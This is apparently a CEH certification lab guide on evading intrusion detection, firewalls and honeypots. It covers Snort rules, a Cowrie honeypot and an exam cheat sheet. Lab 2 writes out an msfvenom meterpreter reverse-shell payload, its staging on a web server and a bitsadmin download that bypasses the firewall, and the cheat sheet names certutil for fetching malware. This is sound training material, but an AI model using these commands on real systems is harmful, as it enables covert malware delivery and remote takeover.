# Module 12: Evading IDS, Firewalls, and Honeypots - Lab Guide

## Tools Used & Purpose

- **Snort**: Open-source network intrusion detection and prevention system (NIDS/NIPS) for analyzing rule-based signature alerts.
- **Suricata**: High-performance multi-threaded IDS/IPS engine performing deep packet inspection and network security monitoring.
- **Cowrie**: Medium-to-high interaction SSH and Telnet honeypot designed to record brute-force attempts and attacker shell interactions.
- **BITSAdmin**: Windows utility used to download malicious payloads covertly using the Background Intelligent Transfer Service to bypass firewall egress rules.
- **Nmap**: Bypassing firewalls and IDS inspection via packet fragmentation (`-f`), MTU sizing (`--mtu`), decoy IPs (`-D`), and source port manipulation (`-g 80`).
- **Hping3**: Crafting arbitrary TCP/UDP packets with customized flags to test firewall rule statefulness and evade perimeter filters.
- **Fragroute**: Intercepting, fragmenting, and scrambling outbound network packets to evade signature-based NIDS inspection.
- **PuTTY**: Setting up encrypted SSH tunnels and dynamic port forwarding (SOCKS proxy) to bypass perimeter egress restrictions.
- **Msfvenom**: Applying multi-layered encoding, polymorphic encoders, and encryption algorithms to evasion payloads.
- **Send-Safe Honeypot Hunter**: Scanning remote IP lists to identify honeypots, open proxy relays, and deception traps.

---

## 9. Hands-On Practical Labs Walkthrough

### Lab 1: Perform Intrusion Detection using Various Tools

#### Task 1: Detect Intrusions using Snort

- <b>Environment:</b>
  - Target / Monitoring Machine: Windows 11 (<code>10.10.1.11</code>) with WinPcap installed.
  - Attacking / Probing Machine: Windows Server 2019 / Parrot Security (<code>10.10.1.13</code>).
  - Snort Version: Snort 2.9.15 x64 (installed at <code>C:\Snort</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Verify Snort Installation & Network Drivers:</b>
     - Open Command Prompt as Administrator on Windows 11.
     - Navigate to Snort binary directory: <code>cd C:\Snort\bin</code>.
     - Execute interface discovery command:
       ```shell
       snort -W
       ```
     - Identify the network interface index number corresponding to the active Ethernet adapter (e.g., Index <code>1</code>).
  2. <b>Verify Snort Packet Capture in Verbose Mode:</b>
     - Start Snort in packet sniffer mode bound to interface 1:
       ```shell
       snort -dev -i 1
       ```
     - Open a secondary Command Prompt window and execute:
       ```shell
       ping google.com
       ```
     - Verify rapid packet output scrolling across the Snort console, confirming the WinPcap driver and Snort decoder are operating. Press <code>Ctrl + C</code> to terminate.
  3. <b>Configure Network Variables in </b><b><code>snort.conf</code></b><b>:</b>
     - Open <code>C:\Snort\etc\snort.conf</code> using Notepad++.
     - Locate <b>Step #1: Set the network variables</b> (around line 45):
       ```txt
       ipvar HOME_NET 10.10.1.11
       ipvar EXTERNAL_NET !$HOME_NET
       ```
     - Locate <b>Step #2: Configure the decoder</b> and define paths:
       ```txt
       var RULE_PATH C:\Snort\rules
       var SO_RULE_PATH C:\Snort\so_rules
       var PREPROC_RULE_PATH C:\Snort\preproc_rules
       var WHITE_LIST_PATH C:\Snort\rules
       var BLACK_LIST_PATH C:\Snort\rules
       ```
     - Create empty placeholder files <code>white_list.rules</code> and <code>black_list.rules</code> in <code>C:\Snort\rules</code>.
  4. <b>Author Custom ICMP Detection Rule:</b>
     - Open or create <code>C:\Snort\rules\ICMP_ECHO.ids</code> (or append to <code>local.rules</code>):
       ```javascript
       alert icmp any any -> $HOME_NET any (msg:"ICMP Echo Request Detected"; itype:8; sid:1000001; rev:1;)
       ```
     - Ensure rule inclusion line exists in <code>snort.conf</code>:
       ```txt
       include $RULE_PATH/ICMP_ECHO.ids
       ```
  5. <b>Execute Snort in NIDS Detection Mode:</b>
     - Launch Snort in IDS mode with console alerting:
       ```shell
       snort -i 1 -c C:\Snort\etc\snort.conf -A console -l C:\Snort\log
       ```
     - Observe initialization banner: <i>Snort initialization completed successfully. Snort is actively listening on interface 1.</i>
  6. <b>Trigger Alert & Analyze Alert Output:</b>
     - From attacking machine (<code>10.10.1.13</code>), send ICMP Echo Requests:
       ```bash
       ping -c 4 10.10.1.11
       ```
     - Observe real-time alert output displayed on Windows 11 Snort console:
       ```txt
       [**] [1:1000001:1] ICMP Echo Request Detected [**]
       [Priority: 0]
       04/16-02:15:32.104523 10.10.1.13 -> 10.10.1.11
       ICMP TTL:64 TOS:0x0 ID:34212 IpLen:20 DgmLen:84
       Type:8  Code:0  ID:1245  Seq:1  ECHO
       ```
     - Document alert evidence and terminate Snort (<code>Ctrl + C</code>).

---

#### Task 2: Deploy Cowrie Honeypot to Detect Malicious Network Traffic

- <b>Environment:</b>
  - Honeypot Server: Ubuntu VM (<code>10.10.1.9</code>).
  - Attacking System: Parrot Security (<code>10.10.1.13</code>).
  - Honeypot Architecture: Cowrie SSH & Telnet Honeypot running in Python virtualenv.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Configure Honeypot Port Redirection & Permissions on Ubuntu (</b><b><code>10.10.1.9</code></b><b>):</b>
     - Acquire root privileges: <code>sudo su</code> (password <code>toor</code>).
     - Configure <code>iptables</code> to redirect incoming port 22 traffic to Cowrie listener port 2222:
       ```bash
       iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
       ```
     - Configure <code>authbind</code> to allow non-root user <code>cowrie</code> to bind low ports:
       ```bash
       touch /etc/authbind/byport/22
       chown cowrie:cowrie /etc/authbind/byport/22
       chmod 770 /etc/authbind/byport/22
       ```
  2. <b>Initialize and Launch Cowrie Honeypot:</b>
     - Switch to cowrie user directory:
       ```bash
       cd /home/ubuntu/cowrie
       virtualenv --python=python3 cowrie-env
       source cowrie-env/bin/activate
       bin/cowrie start
       ```
     - Verify Cowrie startup status in logs:
       ```bash
       tail -f /home/ubuntu/cowrie/var/log/cowrie/cowrie.log
       ```
     - Verify output: <code>CowrieSSHFactory starting on 2222</code> and <code>Ready to accept SSH connections</code>.
  3. <b>Scan Target Honeypot from Attacker Machine (</b><b><code>10.10.1.13</code></b><b>):</b>
     - Open terminal on Parrot Security and execute full port and service scan:
       ```bash
       nmap -p 22,2222 -sV 10.10.1.9
       ```
     - Nmap output reveals:
       ```txt
       PORT     STATE SERVICE VERSION
       22/tcp   open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
       2222/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
       ```
  4. <b>Execute Unauthorized SSH Brute-Force & Session Login:</b>
     - Launch PuTTY or OpenSSH client from Parrot Security:
       ```bash
       ssh ubuntu@10.10.1.9
       ```
     - Attempt multiple unauthorized passwords (e.g., <code>toor</code>, <code>admin</code>, <code>password</code>), which return <code>Access denied</code>.
     - Attempt connection with credentials <code>root</code> / <code>root</code> (Cowrie default accepts <code>root / *</code>):
       ```bash
       ssh root@10.10.1.9
       ```
     - Attacker obtains a simulated interactive bash prompt: <code>root@ubuntu:~#</code>.
  5. <b>Execute Reconnaissance Inside Simulated Honeypot Shell:</b>
     - Attacker executes system discovery commands inside fake shell:
       ```bash
       id
       whoami
       pwd
       cd /
       ls -la
       cat /etc/issue
       ```
  6. <b>Analyze Captured Forensic Logs on Honeypot (</b><b><code>10.10.1.9</code></b><b>):</b>
     - On Ubuntu terminal, examine <code>cowrie.log</code>:
       ```bash
       tail -n 25 /home/ubuntu/cowrie/var/log/cowrie/cowrie.log
       ```
     - Forensic log captures detailed attacker telemetry:
       ```json
       {"eventid": "cowrie.login.failed", "src_ip": "10.10.1.13", "username": "ubuntu", "password": "toor"}
       {"eventid": "cowrie.login.success", "src_ip": "10.10.1.13", "username": "root", "password": "any"}
       {"eventid": "cowrie.command.input", "src_ip": "10.10.1.13", "input": "id"}
       {"eventid": "cowrie.command.input", "src_ip": "10.10.1.13", "input": "whoami"}
       {"eventid": "cowrie.command.input", "src_ip": "10.10.1.13", "input": "ls -la"}
       ```
     - Conclude analysis: Cowrie successfully trapped the attacker, deceived them into believing they compromised a production Linux server, and recorded all commands without exposing underlying host OS assets.

---

### Lab 2: Evade IDS/Firewalls using Various Evasion Techniques

#### Task 1: Evade Firewall through Windows BITSAdmin

- <b>Environment:</b>
  - Target Host: Windows Server 2019 (<code>10.10.1.19</code>) with Windows Defender Firewall enabled (Private & Public profiles active).
  - Attacker System: Parrot Security (<code>10.10.1.13</code>).
  - Technique: Living off the Land (LOLBins) via Windows BITSAdmin over HTTP (TCP Port 80).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Verify Perimeter Firewall on Windows Server 2019:</b>
     - Open Control Panel -> System and Security -> Windows Defender Firewall.
     - Confirm Windows Defender Firewall is <b>ON</b> for both Private and Public network profiles.
  2. <b>Generate Malicious Reverse Shell Payload on Parrot Security (</b><b><code>10.10.1.13</code></b><b>):</b>
     - Open terminal as root (<code>sudo su</code>):
       ```bash
       msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe
       ```
     - Create staging web directory on Apache:
       ```bash
       mkdir -p /var/www/html/share
       chmod -R 755 /var/www/html/share
       chown -R www-data:www-data /var/www/html/share
       cp /home/attacker/Exploit.exe /var/www/html/share/
       service apache2 start
       ```
     - Verify payload accessibility at <code>http://10.10.1.13/share/Exploit.exe</code>.
  3. <b>Execute BITSAdmin Firewall Bypass on Windows Server 2019:</b>
     - Launch PowerShell as Administrator on Windows Server 2019.
     - Execute the native <code>bitsadmin</code> command to initiate an asynchronous HTTP file transfer:
       ```powershell
       bitsadmin /transfer ExploitJob http://10.10.1.13/share/Exploit.exe C:\Exploit.exe
       ```
     - Observe PowerShell transfer progress:
       ```txt
       DISPLAY: 'ExploitJob' TYPE: DOWNLOAD STATE: TRANSIENT_ERROR / CONNECTING
       PROGRESS: 73802 / 73802 (100%)
       Transfer complete.
       ```
  4. <b>Verify Bypass Success & Operational Impact:</b>
     - Open File Explorer on Windows Server 2019 and navigate to <code>C:\</code>.
     - Confirm <code>Exploit.exe</code> exists in <code>C:\</code>.
     - Because <code>bitsadmin</code> operates via the trusted Background Intelligent Transfer Service utilizing standard outbound HTTP (port 80) connections, perimeter firewall inspection and host application filtering rules allowed the executable download without generating blocks or alerts.

## 10. High-Frequency Exam Indicators & Key Memory Anchors

```javascript
+----------------------------------------------------------------------------------------------------+
|                                  CEH v13 EXAM CRITICAL FOCUS POINTS                                |
+----------------------------+-----------------------------------------------------------------------+
| Exam Question Theme        | Key Answer / Official EC-Council Exam Concept                         |
+----------------------------+-----------------------------------------------------------------------+
| True/False Matrix          | False Negative is the MOST DANGEROUS condition (attack succeeds       |
|                            | without triggering any alarm). False Positive leads to alert fatigue. |
+----------------------------+-----------------------------------------------------------------------+
| Snort Rule Action          | Rule header actions: alert, log, pass, drop, reject, sdrop.           |
|                            | (Remember: "pass" drops rule evaluation; "drop" blocks in inline mode)|
+----------------------------+-----------------------------------------------------------------------+
| Snort Rule Direction       | Direction operator: "->" (unidirectional), "<>" (bidirectional).      |
|                            | There is NO "<-" operator in Snort rules!                             |
+----------------------------+-----------------------------------------------------------------------+
| Snort SID Ranges           | sid < 100 = System; 100-999,999 = Official VRT; >= 1,000,000 = Custom.|
+----------------------------+-----------------------------------------------------------------------+
| Insertion vs Evasion       | Insertion: IDS accepts packet, Target drops it.                       |
|                            | Evasion: Target accepts packet, IDS drops/misses it.                  |
+----------------------------+-----------------------------------------------------------------------+
| OS Fragment Reassembly     | Favors First (First-In): Cisco IOS, BSD, Mac OS X, HP-UX, IRIX.       |
|                            | Favors Last (Overwrite): Windows, Linux kernels.                      |
+----------------------------+-----------------------------------------------------------------------+
| Source Port Routing        | nmap -g 53 (or --source-port 53) forces scan from trusted DNS port to |
|                            | bypass misconfigured stateful/packet-filtering firewall rules.        |
+----------------------------+-----------------------------------------------------------------------+
| Nmap Fragmentation Flags   | -f splits into 8-byte fragments; -mtu 16 sets custom 16-byte MTU.     |
+----------------------------+-----------------------------------------------------------------------+
| Decoy Scanning Syntax      | nmap -D RND:10 <target> or nmap -D decoy1,decoy2,ME <target>.         |
+----------------------------+-----------------------------------------------------------------------+
| Honeypot Classifications   | Low-Interaction (Honeyd, KFSensor) = Emulates ports/banners;          |
|                            | Medium-Interaction (Cowrie) = Emulates shell;                         |
|                            | High-Interaction = Real operating system / virtual sandbox.           |
+----------------------------+-----------------------------------------------------------------------+
| Living off the Land (LOL)  | bitsadmin /transfer, certutil -urlcache -split -f to download malware |
|                            | using trusted signed Windows utilities over port 80/443.              |
+----------------------------+-----------------------------------------------------------------------+
| Ingress / Egress Standards | RFC 2827 / BCP 38 governs network ingress and egress filtering to     |
|                            | prevent IP spoofing and unauthorized outbound data exfiltration.      |
+----------------------------+-----------------------------------------------------------------------+
```
